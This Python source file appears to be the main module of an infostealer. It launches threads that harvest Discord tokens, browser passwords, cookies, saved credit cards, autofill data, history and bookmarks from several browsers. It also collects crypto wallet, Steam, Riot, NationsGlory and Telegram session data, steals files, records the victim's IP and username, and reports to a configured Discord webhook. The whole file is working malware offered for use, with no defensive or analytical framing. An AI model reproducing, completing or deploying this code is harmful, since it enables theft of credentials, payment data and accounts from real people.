import os
import threading
from stealer.core import getip, send_webhook
from stealer.browser import getPassw, getCookie, getCCs, getAutofill, getHistory, getBookmarks
from stealer.discord import getTokenFromBrowser, GetDiscordTokenFromClient
from stealer.wallets import GatherZips
from stealer.games import ngstealer, steam_stealer, riot_stealer
from stealer.files import filestealr
from core.config import WEBHOOK_URL

def GatherAll():
    IP = getip()
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    GLINFO = f"IP: {IP} | User: {os.getlogin()}"

    TokensList = []
    PasswList = []
    CookiesList = []
    CCsList = []
    AutofillList = []
    HistoryList = []
    BookmarksList = []
    Threadlist = []

    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/"],
        [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/"],
        [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [f"{local}/Vivaldi/User Data", "vivaldi.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"]
    ]
    discordPaths = [
        [f"{roaming}/discord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]
    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", "Atomic Wallet.exe", "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        [f"{roaming}/Binance/Local Storage/leveldb", "Binance.exe", "Wallet"],
        ["C:\\Program Files (x86)\\Steam\\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [os.path.join(local, "Riot Games", "Riot Client", "Data"), "RiotClientServices.exe", "RiotClient"],
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", "Telegram.exe", "Telegram"]

    # Discord tokens from browsers
    for patt in browserPaths:
        t = threading.Thread(target=getTokenFromBrowser, args=(patt[0], patt[2], TokensList))
        t.start()
        Threadlist.append(t)
    # Discord tokens from Discord clients
    for patt in discordPaths:
        t = threading.Thread(target=GetDiscordTokenFromClient, args=(patt[0], patt[1], TokensList))
        t.start()
        Threadlist.append(t)

    # Browser data (passwords, cookies, etc.)
    def getBrowsers():
        for patt in browserPaths:
            getPassw(patt[0], patt[3], PasswList)
            getCookie(patt[0], patt[4], CookiesList)
            getCCs(patt[0], patt[3], CCsList)
            getAutofill(patt[0], patt[3], AutofillList)
            getHistory(patt[0], patt[3], HistoryList)
            getBookmarks(patt[0], patt[3], BookmarksList)
    t = threading.Thread(target=getBrowsers)
    t.start()
    Threadlist.append(t)

    # Wallets, Telegram, etc.
    t = threading.Thread(target=GatherZips, args=(browserPaths, PathsToZip, Telegram, local, roaming, GLINFO))
    t.start()
    Threadlist.append(t)

    # NationsGlory game
    ng_path = os.path.join(roaming, "NationsGlory", "Local Storage", "leveldb")
    t = threading.Thread(target=ngstealer, args=(ng_path,))
    t.start()
    Threadlist.append(t)

    # Steam stealer
    t = threading.Thread(target=steam_stealer)
    t.start()
    Threadlist.append(t)

    # Riot stealer
    t = threading.Thread(target=riot_stealer, args=(local,))
    t.start()
    Threadlist.append(t)

    # File stealer
    t = threading.Thread(target=filestealr, args=(roaming, GLINFO))
    t.start()
    Threadlist.append(t)

    for t in Threadlist:
        t.join()

    send_webhook("Stealer finished")